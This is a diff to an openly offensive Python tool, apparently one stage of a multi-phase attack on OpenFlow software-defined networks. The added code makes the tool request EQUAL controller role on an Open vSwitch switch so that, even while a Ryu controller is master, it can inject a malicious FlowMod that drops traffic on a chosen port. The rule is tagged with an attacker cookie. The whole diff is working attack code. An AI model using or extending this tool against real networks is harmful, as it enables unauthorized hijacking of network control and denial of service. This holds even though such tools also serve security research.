@@ -90,6 +90,11 @@ OFP_NO_BUFFER = 0xFFFFFFFF
 # Attacker cookie visible in ovs-ofctl dump-flows output.
 # This helps identify the malicious rule after installation.
 ATTACKER_COOKIE = 0xDEADBEEFCAFE0001
+# Controller roles (OpenFlow 1.3)
+OFPT_ROLE_REQUEST = 24
+OFPT_ROLE_REPLY   = 25
+OFPCR_ROLE_EQUAL  = 1  # full access, no mastership
+OFPCR_ROLE_MASTER = 2  # full access, demotes other masters
 
 # Human-readable names for common OpenFlow message types
 _TYPE_NAMES: dict[int, str] = {
@@ -253,6 +258,19 @@ def build_drop_flowmod(target_port: int, priority: int) -> bytes:
         fixed + _build_oxm_match(target_port),
         xid=3
     )
+
+def build_role_request() -> bytes:
+    """
+    Request EQUAL role so OVS allows us to install FlowMods
+    even while Ryu holds MASTER role on the same switch.
+    Body: role(4) + pad(4) + generation_id(8) = 16 bytes
+    """
+    body = struct.pack("!IIQ",
+        OFPCR_ROLE_EQUAL,  # role
+        0,                 # pad
+        0,                 # generation_id (ignored for EQUAL)
+    )
+    return _ofp_header(OFPT_ROLE_REQUEST, body, xid=4)
 
 
 # Phase 1 — Passive Control Channel Sniffer
@@ -483,13 +501,16 @@ def inject_flowmod(
     if len(reply) >= 16:
         dpid = struct.unpack("!Q", reply[8:16])[0]
         print(f"[+] Datapath ID: 0x{dpid:016x}")
+        
+    # Request EQUAL role — required when Ryu already holds MASTER
+    sock.sendall(build_role_request())
+    print("  [SEND]   ROLE_REQUEST (EQUAL)")
+    _read_until(sock, OFPT_ROLE_REPLY)
 
-
-    # Step 3: Inject malicious FlowMod
-    sock.sendall(
-        build_drop_flowmod(target_port, priority)
-    )
-
+    # Step 3: Send the FlowMod -> inject malicious FlowMod
+    sock.sendall(build_drop_flowmod(target_port, priority))
+    	
+    
     print()
     print("                FLOWMOD INJECTED (Tool 3)               ")
     print("--------------------------------------------------------")
